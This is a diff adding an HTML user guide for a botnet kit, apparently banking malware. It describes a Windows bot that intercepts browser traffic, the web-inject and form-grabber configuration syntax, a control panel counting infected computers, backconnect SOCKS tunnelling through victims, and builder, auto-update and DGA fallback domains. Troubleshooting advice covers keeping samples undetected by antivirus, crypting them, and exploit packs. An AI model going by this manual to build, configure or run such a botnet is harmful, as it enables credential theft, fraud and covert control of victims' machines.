@@ -1,0 +1,531 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="ru" lang="ru">
+<head>
+  <title>User guide</title>
+  <meta http-equiv="Content-Type" content="text/html; charset=windows-1251"/>
+  <meta http-equiv="Content-Style-Type" content="text/css"/>
+  <meta http-equiv="Content-Script-Type" content="text/javascript"/>
+  <style type="text/css">
+  html, body
+  {
+    background:  #FFFFFF;
+    color:       #000000;
+    font-family: Verdana, Helvetica, sans-serif;
+    font-size:   12px
+  }
+  a
+  {
+    color: #0060B6
+  }
+  a:hover
+  {
+    color: #174C7E
+  }
+  h1, h2
+  {
+    padding:       2em 0 0.5em 0;
+    border-bottom: solid 1px #CCCCCC
+  }
+  h1
+  {
+    padding-top: 0
+  }
+  table.list, table.samples, table.parameters
+  {
+    border-collapse: collapse
+  }
+  table.list td, table.samples td, table.parameters td
+  {
+    padding:    1em;
+    background: #EEEEEE;
+    border:     1px solid #CCCCCC
+  }
+  </style>
+</head>
+<body>
+
+<h1>User guide</h1>
+<ul>
+  <li><a href="#description_bot">Description</a>
+    <ul>
+      <li><a href="#description_bot">Bot</a></li>
+      <li><a href="#description_cp">Control panel</a></li>
+    </ul>
+  </li>
+  <li><a href="#config_main">Configuration file</a>
+    <ul>
+			<li><a href="#config_main">Main information</a></li>
+      <li><a href="#config_hi">HTTP-inject/HTTP-grabber</a></li>
+    </ul>
+  </li>
+  <li><a href="#cp_server">Control panel</a>
+    <ul>
+      <li><a href="#cp_server">Configuring the server</a></li>
+      <li><a href="#cp_install">Install</a></li>
+      <li><a href="#cp_update">Update</a></li>
+    </ul>
+  </li>
+	<li><a href="#bc">Work with Backconnect-server</a></li>
+	<li><a href="#builder_desc">Builder</a>
+    <ul>
+      <li><a href="#builder_desc">Description</a></li>
+      <li><a href="#builder_step_by_step">Step by step</a></li>
+    </ul>
+  </li>
+   <li><a href="#common_info_update">Common information</a>
+    <ul>
+      <li><a href="#common_info_update">Update</a></li>
+      <li><a href="#common_info_dga">DGA</a></li>
+      <li><a href="#common_info_problems">Problems</a></li>
+    </ul>
+  </li>
+  <li><a href="#faq">F.A.Q.</a></li>
+</ul>
+
+<h2 id="description_bot">Description: Bot</h2>
+<ul>
+  <li>
+    <p><b>Language and IDE programming:</b></p>
+    <p>Visual C++. Used libraries openssl, zlib.</p>
+  </li>
+  <li>
+    <p><b>Supported OS:</b></p>
+    <p>XP-Win10(x86/x64).</p>
+  </li>
+  <li>
+    <p><b>The session with the server (control panel):</b></p>
+    <p>Session with the server through a variety of processes from an internal "white list" that allows you to bypass most firewalls. During the session, the bot can get the configuration to send the accumulated reports, report their condition to the server and receive commands to execute on the computer. The session takes place via HTTP-protocol, all data sent by a bot and received from the server is encrypted with a unique key for each botnet.</p>    
+  </li>
+  <li>
+    <p><b>Protection:</b></p>
+    <ol>
+      <li>Unique names of all objects (files, MUTEXes, registry keys) when creating a bot for every user and a botnet.</li>
+      <li>Fixed bot can not be run with a different operating system or user. Destroys the code that is used to install the bot.</li>
+      <li>At the moment not done to hide bot files through WinAPI, because anti-virus tools are very easy to find such a file, and allow to pinpoint the location of the bot.</li>
+      <li>Autoupdate bot, do not require a reboot.</li>
+      <li>Monitoring the integrity of files the bot.</li>
+    </ol>
+  </li>
+  <li>
+    <p><b>Intercepting HTTP/HTTPS-requests (Opera, Safari, Internet Explorer, Mozilla Firefox, Google Chrome):</b></p>
+    <ol>
+      <li>Modification of the loaded pages content (HTTP-inject).</li>
+      <li>Getting out of the page content the right pieces of data.</li>
+      <li>Temporary blocking HTTP-injects and HTTP-fakes.</li>
+      <li>Temporary blocking access to a certain URL.</li>
+      <li>Blocking logging requests for specific URL.</li>
+      <li>Forcing logging of all GET requests for specific URL.</li>
+    </ol>
+  </li>
+  <li>
+    <p><b>Miscellaneous:</b></p>
+    <ol>
+      <li>Execution of scripts (commands), created in the control panel.</li>
+    </ol>
+  </li>
+ </ul>
+
+<h2 id="description_cp">Description: Control panel</h2>
+<ul>
+  <li>
+    <p><b>Programming language:</b></p>
+    <p>PHP, using the extensions mysqli.</p>
+  </li>
+  <li>
+    <p><b>Display statistics:</b></p>
+    <ol>
+      <li>Number of infected computers.</li>
+      <li>Current number of bots in the online.</li>
+      <li>The number of new bots.</li>
+      <li>Daily activity of bots.</li>
+      <li>Country statistics.</li>
+			<li>Number of HTTP(S) reports.</li>
+			<li>Number of HTTP(S) reports per day.</li>
+      <li>Statistics by OS.</li>
+			<li>Statistics by AV.</li>
+    </ol>
+  </li>
+  <li>
+    <p><b>Working with the list of bots:</b></p>
+    <ol>
+      <li>Filtering the list by country, botnets, IP-addresses, NAT-status, etc.</li>
+      <li>Displaying desktop screenshots in real time (only for bots outside NAT).</li>
+      <li>Mass inspection of the Socks-servers state.</li>
+      <li>Displays detailed information about the bots. Of the most important here are:
+        <ul>
+          <li>Bot version.</li>
+          <li>Location and computer IP-address (not for local).</li>
+					<li>Time in online.</li>
+        </ul>
+    </ol>
+  </li>
+  <li>
+    <p><b>Scripts (commands):</b></p>
+    <p>You can control the bots by creating a script for them. Currently, syntax and scripting capabilities, are very primitive.</p>
+  </li>
+</ul>
+
+<!-- КОНЧАЛО: Описание: Панель управления -->
+<h2 id="config_main">Configuration file: Main information.</h2>
+<b> [StaticConfig] </b> - included in <b>loader.exe</b>.
+<ul>
+	<li>
+		<b>botnet</b>
+		<p>
+			- name for botnet <font color=red>(it should not be changed throughout the life of a botnet)</font>.
+		</p>
+	</li>
+	<li>
+		<p><b>timer_logs [? - success] [? - error]</b></p>
+		<p> - intervals for sended reports (in minutes). <br><br><i> example: "timer_logs 20 3" </i> </p>
+	</li>
+	<li>
+		<p><b>timer_stats [? - success] [? - error]</b></p>
+		<p> - intervals for knock a bot (in minutes). <br><br><i> example: "timer_stats 15 2" </i> </p>
+	</li>
+	<li>
+		<p><b>url_config</b></p>
+		<p>
+			- the address to which the <b>(config.bin)</b> will be downloaded, only for install.
+		</p>
+	</li>
+	<li>
+		<p><b>url_bot</b></p>
+		<p>
+			- the address to which the <b>(bot.bin)</b> will be downloaded, only for install.
+		</p>
+	</li>
+	<li>
+		<p><b>encryption_key</b></p>
+			<p>
+				- encryption key for communicate bot with CC.
+			</p>
+	</li>
+	<li>
+		<p><b>debug</b></p>
+		<p>
+				- debug mode (need for run a bot on local machine(RU) and debug injects).
+			<br><br><i> example: "debug 1" </i> - enable <font color=red> (for debug) </font>
+			<br><i> example: "debug 0" </i> - disable <font color=red> (for release) </font>
+			<br><br>
+			If "debug 1" bot ignored "timer_logs" and "timer_stats", knock to panel and send logs every second.
+		</p>
+	</li>
+</ul>
+<hr>
+<b> [DynamicConfig] </b> - included in <b>config.bin</b>.
+<ul>	
+	<li>
+		<p><b>url_server</b></p>
+		<p>
+				- the address for knock a bot(gate.php).
+		</p>
+	</li>
+	
+		<li>
+		<p><b>AdvancedConfigs</b></p>
+		<p>
+				- reserved adresses for download <b>config.bin</b>, if main address<b>(url_server)</b> not available. 
+			</p>
+	</li>
+	
+		<li>
+		<p><b>WebFilters</b></p>
+		<p>
+			- addresses the need to forcibly write to reports or not to write used flag '!'.
+			<br><br>		
+			<i> example: "!https://*facebook.*" </i> - ignored.
+		</p>
+	</li>
+</ul>
+<hr>
+<p> Bot worked with http and https(<b>recommended</b>). </p>
+
+<!-- ГЌГЂГ—ГЂГ‹ГЋ: ГЋГЇГЁГ±Г Г­ГЁГҐ: Г”Г Г©Г« ГЄГ®Г­ГґГЁГЈГіГ°Г Г¶ГЁГЁ: HTTP-ГЁГ­Г¦ГҐГЄГІГ»/HTTP-ГЈГ°Г ГЎГЎГҐГ°Г» -->
+<h2 id="config_hi">Configuration file: HTTP-inject/HTTP-grabber.</h2>
+<p>For the convenience of writing, HTTP-inject/HTTP-grabber are recorded in a separate file specified in the configuration file as "DynamicConfig.file_webinjects". Naturally, after creating the end-configuration file, not any additional files are generated.</p>
+<p>The file consists of a list of URLs for which you can specify an unlimited number of any modification thereto or derived from their data. The current URL is the following line:<p>
+<p><b>set_url [url] [options] [postdata_blacklist] [postdata_whitelist] [url_block] [matched_context]</b></p>
+<p><b>Parameters:</b></p>
+<table class="parameters">
+  <tr>
+    <td>url</td>
+    <td>URL, on which must be run HTTP-inject/HTTP-grabber. Allowed the use of masks (* and # symbols).</td>
+  </tr>
+  <tr>
+    <td>options</td>
+    <td>
+      Defines basic terms and conditions for the records, consists of a combination of the following characters:
+      <ul>
+        <li><b>P</b> - runs at <a target="_blank" href="http://en.wikipedia.org/wiki/GET_(HTTP)#Request_methods">POST-request</a>.</li>
+        <li><b>G</b> - runs at <a target="_blank" href="http://en.wikipedia.org/wiki/GET_(HTTP)#Request_methods">GET-request</a>.</li>
+        <li><b>L</b> - if this symbol is specified, then starts going as HTTP-grabber, if not specified, goes as HTTP-inject.
+        <li><b>D</b> - blocks run more than once in 24 hours. <u>This symbol requires a mandatory presence of the parameter url_block.</u></li>
+        <li><b>H</b> - complements the symbol "L", saves the contents without stripping the HTML-tags. In normal mode the same, all HTML-tags are removed, and some are transformed into a character "new line" or "gap".</li>
+        <li><b>I</b> - compare the url parameter insensitive (only for engl. alphabet).</li>
+        <li><b>C</b> - compare the context insensitive (only for engl. alphabet).</li>
+				<li><b>B</b> - blocks run inject.</li>
+      </ul>    
+    </td>
+  </tr>
+  <tr>
+    <td>postdata_blacklist</td>
+    <td>Complete (from beginning to end) the contents of POST-data, which <b>should not</b> be run. Allowed the use of masks (* and ? symbols).</br></br>Parameter is optional.</td>
+  </tr>
+  <tr>
+    <td>postdata_whitelist</td>
+    <td>Full (from beginning to end) content POST-data, which <b>should</b> be run. Allowed the use of masks (* and ? symbols).</br></br>Parameter is optional.</td>
+  </tr>
+  <tr>
+    <td>url_block</td>
+    <td>
+      <b>In the absence of the symbol "D" in the options parameter:</b>
+      <p>If the run must occur only once, then should be specified a URL, in this case the further run will be blocked. Expects that URL to begin immediately after HTTP-inject/HTTP-grabber application. If, after blocking will need rerun, then the lock can be removed via the command "<a href="#bot_httpinject_enable">bot_httpinject_enable</a>" with a parameter, for example, equal to the parameter url.</p>      
+      <b>In the presence of the symbol "D" in the options parameter:</b>
+      <p>You must specify a URL, when referring to that, run will be locked at 24-th hour. Expectats that the URL begins immediately after HTTP-inject/HTTP-grabber application. <u>This lock can not be removed by a command "bot_httpinject_enable".</u></p>
+      Parameter is optional in the absence of a symbol "D" in the options parameter.
+    </td>
+  </tr>
+  <tr>
+    <td>matched_context</td>
+    <td>Subcontent (substring) URL content, which should be run. Allows the use of masks (* and ? symbols).</br></br>Parameter is optional.</td>
+  </tr>
+</table>
+<p>With the next line begins a list of changes introduced in the contents of the URL, and if the symbol "L" is in the parameter options - a list of data is retrieved from the content URL. This list lasts until it reaches the end of the file, or is specified a new URL.</p><p>Unit list consists of three elements in random order:</p>
+<table class="parameters">
+  <tr>
+    <td>data_before</td>
+    <td>
+      <b>In the absence of the symbol "L" in the options parameter:</b>
+      <p>Subcontent in the URL content, after which you want to enter new data.</p>
+      <b>In the presence of the symbol "L" in the options parameter:</b>
+      <p>Subcontent in the URL content, after which you want to start to get data for the report.</p>
+      Allows the use of masks (* and ? symbols).
+    </td>
+  </tr>
+  <tr>
+    <td>data_after</td>
+    <td>
+      <b>In the absence of the symbol "L" in the options parameter:</b>
+      <p>Subcontent in the URL content, to which you want to finish the new data.</p>
+      <b>In the presence of the symbol "L" in the options parameter:</b>
+      <p>Subcontent in the URL content, after which the need to finish getting the data for the report.</p>
+      Allows the use of masks (* and ? symbols).
+    </td>
+  </tr>
+  <tr>
+    <td>data_inject</td>
+    <td>
+      <b>In the absence of the symbol "L" in the options parameter:</b>
+      <p>The new data, that will be inserted between data_before and data_after data.</p>
+			<p> Allows the use macros %BOTID%.</p>
+      <b>In the presence of the symbol "L" in the options parameter:</b>
+      <p>Subcontent in the URL content, after which the need to finish getting the data for the report.</p>
+    </td>
+  </tr>
+</table>
+
+<h2 id="cp_server">Control panel: Server configuration</h2>
+<p>The server is the central point of control the botnet, it is engaged in collecting reports of bots and command bots. It is not recommended to use "Virtual Hosting" or "VDS", as with an increase in the botnet, the server will increase, and this kind of web hosting quickly exhaust its resources. You need a "Dedicated Server" (Ded), the recommended minimum configuration:</p>
+<ul>
+  <li>2Gb RAM.</li>
+  <li>2x 2GHz processor speed.</li>
+  <li>Separate hard drive for the database.</li>
+	<li>OS Linux/Windows.</li>
+</ul>
+<ul>
+	<li>
+    <p><b>PHP interpreter:</b></p>
+    <p>It is important to make the following settings php.ini:</p>
+    <ul>
+      <li>safe_mode = Off</li>
+      <li>magic_quotes_gpc = Off</li>
+      <li>magic_quotes_runtime = Off</li>
+      <li>memory_limit = 256M  ;Or higher.</li>
+      <li>post_max_size = 100M ;Or higher.</li>
+			<li>short_open_tag = On (in 5.4+ enabled by default).</li>
+    </ul>
+    <p>and also recommended that you change these settings:</p>
+    <ul>
+      <li>display_errors = Off</li>
+    </ul>
+  </li>
+  <li>
+    <p><b>MySQL-server:</b></p>
+    <p>MySQL is required to store all data about the botnet. The recommended version is not below 5.1.30, well worth considering, that when ran the control panel in the older versions were detected some problems. All table control panel, go to format MyISAM, it is important to optimize speed of work with this format, based on the available server resources.</p>
+    <p>Recommended the following changes to the settings MySQL-server (my OR my.ini):</p>
+    <ul>
+      <li>max_connections=2000 #Or higher</li>
+    </ul>
+    <p>Download MySQL: <a href="http://dev.mysql.com/downloads/">http://dev.mysql.com/downloads/</a>.</p>
+  </li>
+</ul>
+
+<h2 id="cp_install">Control panel: Installation</h2>
+<p>Designation of files and folders:</p>
+<table class="list">
+  <tr><td>/install</td><td>installer</td></tr>
+  <tr><td>/core</td><td>system files</td></tr>
+  <tr><td>/core/config.php</td><td>configuration file</td></tr>
+  <tr><td>/template</td><td>theme files (design)</td></tr>
+  <tr><td>cp.php</td><td>control panel entrance</td></tr>
+  <tr><td>gate.php</td><td>gate for bots</td></tr>
+  <tr><td>index.php</td><td>empty file to prevent listing of files</td></tr>
+</table>
+<p>The control panel is usually located in your distribution folder www. All contents of this folder is for upload to the server in any location accessible via HTTP. If you upload it via FTP, all files must be uploaded in BINARY mode.</p>
+<p>For nix-systems set rights:</p>
+<table class="list">
+  <tr><td>/core</td><td>777</td></tr>
+  <tr><td>/tmp</td><td>777</td></tr>
+</table>
+<p>Once all files are uploaded and are set the rights, need to run in the browser the installer from URL http://server/directory/install/index.php. Follow the on-screen instructions, in case of errors (You will be notified in detail) in the installation process, check the entered data, and proper rights setting to the folder.</p>
+<p>After installing, is recommended to remove the install directory, and rename files cp.php (control panel entrance) and gate.php (gate for bots) to any files you like (the extension cannot be changed).</p>
+<p>Now you can safely enter into the control panel by typing in the browser URL the renamed file cp.php.</p>
+
+
+<h2 id="cp_update">Control panel: Update</h2>
+<p>If you have a newer copy of the control panel, and want to update an older version, you must do the following:</p>
+<ol>
+  <li>Copy the files of the new panel in place of the old.</li>
+  <li>Rename the files cp.php and gate.php under their real names you selected when you installed the old control panel.</li>
+  <li>Just in case, re-set the directories rights under <a href="#cp_install">this</a> section.</li>
+  <li>Run the installer throuh a browser URL http(s)://*/install/index.php, and follow the on-screen instructions. The process of the installer may take quite a long period of time, due to the fact that some of the tables with the reports can be recreated.</li>
+	<li>Remove "install" dir.</li>
+  <li>You can use the new control panel.</li>
+</ol>
+
+<!-- НАЧАЛО: Работа с Backсonnect-сервером -->
+<h2 id="bc">Working with the Backonnect-server</h2>
+<p>Working with the BackConnect with example.</p>
+<ul>
+  <li>Backconnect-server IP-address: 192.168.100.1.</li>
+  <li>Port for bot: 4500.</li>
+  <li>Port for the client application: 1080.</li>
+  <li>Bot service: socks.</li>  
+</ul>
+<ol>
+  <li><p>Run a server application(bcs.exe) on the server having its own IP-address on the Internet, for application indicated port, which waits for a connection from a bot, and the port which will connect the client application. For example bcs.exe listen -cp:1080 -bp:4500, where 1080 - client port, 4500 - port for the bot.</p></li>
+  <li><p>Necessary to send command to bot "<a href="#bot_bc_add">bot_bc_add</a> socks 192.168.100.1 4500".</p></li>
+  <li><p>Now you need to wait for a connection from the bot to the server, in this period, any attempt to connect the client application will be ignored (will take disconnect from the client). The sign of the connected bot will be output to the console server line "Accepted new conection from bot...".</p></li>
+  <li><p>After connecting the bot, you can work with your client application. I.e. You simply connect to the server to the client port (in this case 1080). For example, if you are giving socks commands, then on the client port you would expect Socks-server.</p></li>
+  <li><p>After that, when you do not need Backconnect from the bot for a specific service, should issue the command "<a href="#bot_bc_remove">bot_bc_remove</a> socks 192.168.100.1 4500".</p></li>
+</ol>
+<p><b>NOTES:</b></p>
+<ol>
+  <li>You can specify any number of Backconnects (i.e. bot_bc_add), but they should not be a common combination of IP + Port. But if there is such a combination, will run the first added.</li>
+  <li>For each Backconnect, you must run a separate server application.</li>
+  <li>In case of disconnection (server down, drop bot, etc.), the bot will reconnect to the server indefinitely (even after restarting PC), until Backconnect will not be removed (i.e. bot_bc_remove).</li>
+  <li>As a service for bot_bc_add, you can use any open port at the address 127.0.0.1.</li>
+  <li>Server application supports IPv6, but currently this support is not particularly relevant.</li>
+  <li>You can launch the server application under Wine. Writing the same elf application is not currently scheduled.</li>
+  <li>It is highly recommended to use for the bp server application popular ports (80, 8080, 443 etc.), i.e. other ports may be blocked by the provider that owns the bot.</li>
+  <li>Not to be allowed to subscribe different bots on one and the same server port at the same time.</li>
+  <li>The method of such a connection might be useful for bots, which are outside the NAT, i.e. sometimes WIndows firewall of providers, may block the Internet connection.</li>
+</ol>
+<!-- КОНЧАЛО: Работа с Backсonnect-сервером -->
+
+<h2 id="builder_desc">Builder: Description</h2>
+<ul>
+  <li><p><b>1) build bot</b></p>
+    	- output file "loader.exe" <b>(included StaticConfig + public_key.pem)</b>.</p>
+			- output file "bot.bin". </p>
+  </li>
+	<li><p><b>2) build config</b></p>
+    <p>- output file "config.bin" <b>(included DynamicConfig + webinjects)</b>.</p>
+  </li>
+	<li><p><b>3) build keys</b></p>
+    <p> - create pair keys for sign <b>config.bin</b>. <br/>
+				- output files "private_key.pem" and "public_key.pem". <br/> <br/>
+				<font color=red> Keys should not be changed throughout the life of a botnet </font><i>(recommended)</i>.
+		</p>
+  </li>
+	<li><p><b>4) generate certificate</b></p>
+    <p> - create ssl certificate. <br/>
+				- output files "certificate/cert.pem" and "certificate/key.pem". <br/> <br/>
+				Need for web server if needed to work with https, certificate created not valid, bot ignored it. <br>
+				A certicate can be created in elsewhere. It does not matter where it was created.
+		</p>
+  </li>
+</ul>
+
+<h2 id="builder_step_by_step"> Builder: Step by step</h2>
+<ul>
+  <li> 
+		<b> Create keys (3). </b> 
+		<p> 
+				- store on your computer. <br>
+				- keys generated once for each botnet. </p>
+	</li>
+	<li> 
+		<b> Build bot (1). </b> 
+		<p> - required a keys (3). </p>
+		<p> - information in <b>StaticConfig</b> should be filled. </p>
+	</li>
+	
+	<li> 
+		<b> Build config (2). </b>
+		<p> - required a keys (3). </p>
+		<p> - recreating every time if you changed injects or <b>DynamicConfig</b>. </p>
+	</li>
+	
+	<li> 
+		<b> Create certificate for SSL (4). </b>
+		<p> - i recommend use <b>SSL</b>, increases FUD your domains.<br>
+	</li>
+</ul>
+
+<h2 id="common_info_update">Common information: Update</h2>
+To update files <b>(loader.exe, bot.bin, config.bin)</b> need to go admin panel and move to "Updater", fill actual link for file to be update and press "Update". </br> 
+Link and file should be accessible until all bots not updated. </br></br>
+Names of files should be different from the original names: </br> 
+<ul>
+	<li> loader.exe > <b>[URL loader]</b> > http(s)://[path]/a1.exe; </li>
+	<br/>
+	<li> bot.bin > <b>[URL bot]</b> > http(s)://[path]/a2m.bin; </li>
+	<br/>
+	<li> config.bin > <b>[URL config]</b> > http(s)://[path]/a3c.bin; </li>
+</ul>
+
+</br>
+Algorithm update:
+<ul>
+	<li> The bot knock every <b> timer_stats </b>. </li>
+	<li> Admin panel gives a checksum files and paths to them. </li>
+	<li> The bot checkes the checksum and if the checksum different from the bot file starts downloading the new file and update. </li>
+</ul>
+
+<h2 id="common_info_dga">Common information: DGA</h2>
+If your domains(main and reserved) locked, move to admin panel(DGA), choose any domain and register it.</br>
+Bot generate address: <b> http(s)://[%RAND%].com/[botnet].bin </b> where <b>botnet</b> is <b>[StaticConfig] -> botnet</b>.</br></br>
+
+Note: it is better to register immediately for the next 3-4 days. </br>
+Note: config.bin > [botnet].bin
+
+<h2 id="common_info_problems">Common information: Problems</h2>
+<ul>
+	<li> <b> Injects and form grabber does not work. </b> </li>
+	<p> 1) Proxifier is launched on OS where the bot works? If yes, proxifier must be turned off. </p>
+	<p> 2) The correct date on the computer? If no, pls set correct date and restart the bot. </p>
+	<p> 3) The bot was launched on RU OS with disable "debug" in StaticConfig? If yes, pls enable debug mode in StaticConfig, rebuild the bot and restart.</p>
+	<p> If the problem persists, contact me. </p>
+	<li> <b> The bot not knock!!! </b> </li>
+	<p> 
+		1) Check your crypted sample on scaner AV. </br>
+		2) Before loads crypted sample needed to test on VM, better on Windows XP. <br>
+		3) If you used <b>https</b> protocol, you should make sure what enabled support old ssl protocols on server (SSLv2, SSLv3), not all XP supported new protocols.
+		<br>
+		<b>Example: </b> <a href="https://mozilla.github.io/server-side-tls/ssl-config-generator/"> ssl-config-generator</a>
+		</p>
+		
+		If sample is clear, knocks with VM, but not knocks on loads, this means that the problems with traffic or exploits pack. <br>
+		If the problem can not be solved and you are sure what the traffic and exploits pack is ok, the bot is not suitable for you.
+</p>		
+<li> <b> Knocked over 100500 bots and live on the next day there are only 20. </b> </li>
+</br>
+	Check your domains on FUD and a lock. If no probem you sell a bad traffic, i'm here does not help.
+</ul>
+
+<h2 id="faq">F.A.Q.</h2>
+<br>
+</body>
+</html>
